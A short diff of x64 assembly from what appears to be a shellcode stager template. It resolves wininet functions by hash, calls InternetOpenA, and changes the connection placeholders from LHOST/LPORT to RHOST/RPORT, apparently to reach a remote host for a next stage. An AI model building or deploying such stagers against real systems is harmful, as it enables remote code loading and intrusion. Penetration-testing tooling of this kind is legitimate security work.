@@ -136,12 +136,12 @@ to_rename_17c:
     mov r10,%HASH__wininet.dll__InternetOpenA% ; wininet.InternetOpenA()
     call rbp
     call to_rename_1a5
-    db `%LHOST%\0`
+    db `%RHOST%\0`
 
 to_rename_1a5:
     pop rdx
     mov rcx,rax
-    mov r8,%LPORT%
+    mov r8,%RPORT%
     xor r9,r9
     push rbx
     push rbx
